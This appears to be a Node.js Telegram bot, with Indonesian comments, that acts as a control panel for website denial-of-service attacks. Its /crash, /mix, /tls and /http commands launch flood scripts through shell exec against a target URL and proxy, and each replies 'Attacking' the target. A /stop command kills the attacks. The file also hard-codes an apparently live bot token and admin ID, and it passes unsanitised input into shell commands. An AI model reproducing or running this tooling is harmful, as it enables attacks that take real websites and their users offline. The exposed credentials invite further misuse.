const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Token bot Telegram Anda
const token = '7086354549:AAEGoa7OotbaJ5lfOuAwh1AoWGitjZfHz5I';

// ID admin yang diizinkan
const adminId = '6803990183';

// Buat instance bot Telegram
const bot = new TelegramBot(token, { polling: true });

// Simpan referensi ke semua proses yang berjalan
const processes = [];

// Mendengarkan perintah dari pengguna
bot.onText(/\/crash (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const time = match[2];
  const proxy = match[3];

  // Memeriksa apakah pengguna adalah admin yang diizinkan
  if (userId.toString() !== adminId) {
    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
    return;
  }

  // Memeriksa apakah pesan lengkap
  if (!url || !time || !proxy) {
    bot.sendMessage(chatId, 'Format Salah. Gunakan /crash [url] [time] [proxy]');
    return;
  }

  // Menjalankan perintah shell menggunakan exec
  const process = exec(`node crash.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Error: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Attacking ${url} with proxy ${proxy}`);
  });

  // Simpan referensi ke proses
  processes.push(process);
});

// Mendengarkan perintah dari pengguna
bot.onText(/\/mix (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const time = match[2];
  const proxy = match[3];

  // Memeriksa apakah pengguna adalah admin yang diizinkan
  if (userId.toString() !== adminId) {
    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
    return;
  }

  // Memeriksa apakah pesan lengkap
  if (!url || !time || !proxy) {
    bot.sendMessage(chatId, 'Format Salah. Gunakan /mix [url] [time] [proxy]');
    return;
  }

  // Menjalankan perintah shell menggunakan exec
  const process = exec(`node mix.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Error: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Attacking ${url} with proxy ${proxy}`);
  });

  // Simpan referensi ke proses
  processes.push(process);
});

bot.onText(/\/tls (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const time = match[2];
  const proxy = match[3];

  // Memeriksa apakah pengguna adalah admin yang diizinkan
  if (userId.toString() !== adminId) {
    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
    return;
  }

  // Memeriksa apakah pesan lengkap
  if (!url || !time || !proxy) {
    bot.sendMessage(chatId, 'Format Salah. Gunakan /tls [url] [time] [proxy]');
    return;
  }

  // Menjalankan perintah shell menggunakan exec
  const process = exec(`node TLS.js ${url} ${time} 60 5 ${proxy}`, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Error: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Attacking ${url} with proxy ${proxy}`);
  });

  // Simpan referensi ke proses
  processes.push(process);
});

bot.onText(/\/http (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const time = match[2];
  const proxy = match[3];

  // Memeriksa apakah pengguna adalah admin yang diizinkan
  if (userId.toString() !== adminId) {
    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
    return;
  }

  // Memeriksa apakah pesan lengkap
  if (!url || !time || !proxy) {
    bot.sendMessage(chatId, 'Format Salah. Gunakan /tls [url] [time] [proxy]');
    return;
  }

  // Menjalankan perintah shell menggunakan exec
  const process = exec(`node httpensz.js ${url} ${time} 50 ${proxy}`, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Error: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Attacking ${url} with proxy ${proxy}`);
  });

  // Simpan referensi ke proses
  processes.push(process);
});

// Mendengarkan perintah stop dari pengguna
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Memeriksa apakah pengguna adalah admin yang diizinkan
  if (userId.toString() !== adminId) {
    bot.sendMessage(chatId, 'Anda tidak diizinkan menggunakan perintah ini.');
    return;
  }

  // Hentikan semua proses yang berjalan
  processes.forEach((process) => {
    process.kill();
  });

  // Kosongkan array proses
  processes.length = 0;

  bot.sendMessage(chatId, 'Semua proses telah dihentikan.');
});

// Jalankan bot
bot.startPolling();